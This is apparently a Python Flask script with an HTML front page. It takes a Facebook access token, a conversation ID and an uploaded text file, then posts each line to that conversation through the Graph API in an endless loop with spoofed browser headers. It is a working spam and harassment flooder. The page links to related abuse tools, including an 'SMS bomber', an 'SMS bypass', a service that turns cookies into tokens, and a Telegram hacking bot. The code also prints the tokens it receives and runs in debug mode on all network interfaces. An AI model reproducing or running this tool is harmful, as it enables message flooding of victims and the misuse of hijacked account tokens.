from flask import Flask, request
import requests
from time import sleep
import time
from datetime import datetime
app = Flask(__name__)
app.debug = True

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        access_token = request.form.get('accessToken')
        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        while True:
            try:
                for message1 in messages:
                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                    message = str(mn) + ' ' + message1
                    parameters = {'access_token': access_token, 'message': message}
                    response = requests.post(api_url, data=parameters, headers=headers)
                    if response.status_code == 200:
                        print(f"Message sent using token {access_token}: {message}")
                    else:
                        print(f"Failed to send message using token {access_token}: {message}")
                    time.sleep(time_interval)
            except Exception as e:
                print(f"Error while sending message using token {access_token}: {message}")
                print(e)
                time.sleep(30)


    return '''
<!DOCTYPE html> 
</head> 

<body>
       <style> 
        .GFG { 
           width:700px;
           height:100px;
           background:Neon DarkSlateGray or DarkSlateGrey (W3C;
           border:none;
           color:cyan;
        } 
    </style> 
    <style>
    body{
      background-color: #5865F2;
    }
     <style> 
    <style> 
        .ABI { 
           width:700px;
           height:100px;
           background:red;
           border:none;
           color:white;
        } 
    </style> 
    <style> 
        .ABB { 
           width:700px;
           height:100px;
           background:blue;
           border:none;
           color:white;
        } 
    </style> 
    <style> 
        .ABC { 
           width:700px;
           height:100px;
           background:LightBlue;
           border:none;
           color:lime;
        } 
    </style> 
    <style> 
        .ABD { 
           width:700px;
           height:100px;
           background:Yellow;
           border:none;
           color:Magenta;
        } 
    </style> 
    <style> 
        .ABE { 
           width:700px;
           height:100px;
           background:Lime;
           border:none;
           color:white;
        } 
    </style> 
    <style> 
        .ABF { 
           width:700px;
           height:100px;
           background:Magenta;
           border:none;
           color:white;
        } 
    </style> 
    <style> 
        .ABH { 
           width:700px;
           height:100px;
           background:red;
           border:none;
           color:white;
        } 
    </style> 
    <style> 
        .ABJ { 
           width:700px;
           height:100px;
           background: Green;
           border:none;
           color:white;
        } 
    </style> 
    <style> 
        .ABK { 
           width:700px;
           height:100px;
           background: Turquoise;
           border:none;
           color:white;
        } 
    </style> 
    <style> 
        .ABL { 
           width:700px;
           height:100px;
           background: Blue;
           border:none;
           color:white;
        } 
    </style> 
    <style> 
        .ABZ { 
           width:150px;
           height:100px;
           background: red;
           border:none;
           color:white;
        } 
    </style> 
    <style> 
        .ABY { 
           width:150px;
           height:100px;
           background: red;
           border:none;
           color:white;
        } 
    </style> 
<p align="left"> <img align="right" alt="coding" width="405" src="https://user-images.githubusercontent.com/55389276/140866485-8fb1c876-9a8f-4d6a-98dc-08c4981eaf70.gif">
</p>
<p align="left"> <img src="https://www.facebook.com/TECHNICALABHI07?mibextid=ZbWKwL" alt="abhinav-pandit" /> </p>




<h3 align="left">𝐉𝐚𝐲 𝐬𝐡𝐫𝐢 𝐫𝐚𝐦 ❤:</h3>
<p align="left">
<a href="https://t.me/TECHNICALABHI07" target="blank"><img align="center" src="https://technical-abhi-pannel.onrender.com/" alt="techgod143" height="30" width="40" /></a>
<a href="https://www.facebook.com/TECHNICALABHI07?mibextid=ZbWKwL" target="blank"><img align="center" src="https://raw.githubusercontent.com/rahuldkjain/github-profile-readme-generator/master/src/images/icons/Social/facebook.svg" alt="techgod143" height="30" width="40" /></a>
<a href="https://www.instagram.com/mcrahvin07/profilecard/?igsh=dXBiM2s4MDd5b2th" target="blank"><img align="center" src="https://raw.githubusercontent.com/rahuldkjain/github-profile-readme-generator/master/src/images/icons/Social/instagram.svg" alt="techgod143" height="30" width="40" /></a>
<a href="https://youtube.com/@mcrahvin07?si=oT0_SMGzULsK_Xhs" target="blank"><img align="center" src="https://raw.githubusercontent.com/rahuldkjain/github-profile-readme-generator/master/src/images/icons/Social/youtube.svg" alt="tech god" height="30" width="40" /></a>
</p>
    <a href="https://ipinfo.io/?utm_medium=social&utm_source=heylink.me">
    <button class="ABY"> 
        𝐈𝐏-𝐀𝐃𝐑𝐒
    </button> 
</body> 
</p>
    <a href="https://t.me/@abh7555">
    <button class="GFG"> 𝐓𝐇𝐈𝐒 𝐈𝐒 𝐌𝐀𝐃𝐄 𝐁𝐘: 𝐀𝐁𝐇𝐈-𝐗𝐃-𝐖𝐄𝐁 :=
    </button> 
</body> 
</p>
 <a href="https://github.com/AbhinavRahul/OFFLINE-SERVER-BY-TECHNICAL-ABHI.git">
    <button class="ABB"> 
        ☞𝐎𝐅𝐅𝐋𝐈𝐍𝐄--𝐒𝐄𝐑𝐕𝐄𝐑☜
    </button> 
</body> 
</p>
 <a href="https://facebook-post-server-technical-abhi2m-47rs.onrender.com">
    <button class="ABK"> 
        ☞𝐏𝐎𝐒𝐓 𝐒𝐄𝐑𝐕𝐄𝐑☜
    </button> 
</body> 
</p>
 <a href="https://Abhi-cookies-therulexfacts07.replit.app">
    <button class="ABC"> 
        𝐂𝐨𝐨𝐤𝐢𝐞𝐬 -𝐩𝐨𝐬𝐭- 𝐬𝐚𝐫𝐯𝐞𝐫
    </button> 
</body> 
</p>
 <a href="https://github.com/AbhinavRahul">
    <button class="ABD"> 
        ☞𝐀𝐋𝐋-𝐗𝐃-𝐒𝐂𝐑𝐈𝐏𝐓☜
    </button> 
</body> 
</p>
 <a href="https://www.kojaxd.online/">
    <button class="ABE"> 
        ☞𝐂𝐎𝐎𝐊𝐈𝐄𝐒--𝐂𝐎𝐍𝐕𝐑𝐓 𝐓𝐎 --𝐓𝐎𝐊𝐄𝐍☜
    </button> 
</body> 
</p>
 <a href="https://www.kojaxd.online/">
    <button class="ABF"> 
        ☞𝐀𝐋𝐋---𝐈𝐍---𝐎𝐍𝐄☜
    </button> 
</body> 
</p>
 <a href="https://t.me/smsbaipas">
    <button class="ABH"> 
        ☞𝐒𝐌𝐒--𝐁𝐘--𝐏𝐀𝐒𝐒☜
    </button> 
</body> 
</p>
 <a href="https://youtube.com/@rulexyt07?si=zF5jsGKC_ui_9Mk2">
    <button class="ABJ"> 
        ☞𝐘𝐎𝐔𝐓𝐔𝐁𝐄 𝐂𝐇𝐀𝐍𝐍𝐄𝐋☜
    </button> 
</body> 
</p>
 <a href="@NETABHINAVHACK_bot">
    <button class="ABK"> 
        ☞𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌☜
    </button> 
</body> 
</p>
 <a href="https://mytoolstown.com/smsbomber/#bestsmsbomber">
    <button class="ABL"> 
        ☞𝐒𝐌𝐒--𝐁𝐎𝐌𝐁𝐄𝐑☜
    </button> 
</body> 
</p>





<a href="https://www.kojaxd.online/">
    <button class="ABZ"> 
        𝐇𝐨𝐦𝐞
    </button> 
</body> 
</p>
  </footer>
</body>
  </html>           
    '''


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
    app.run(debug=True)
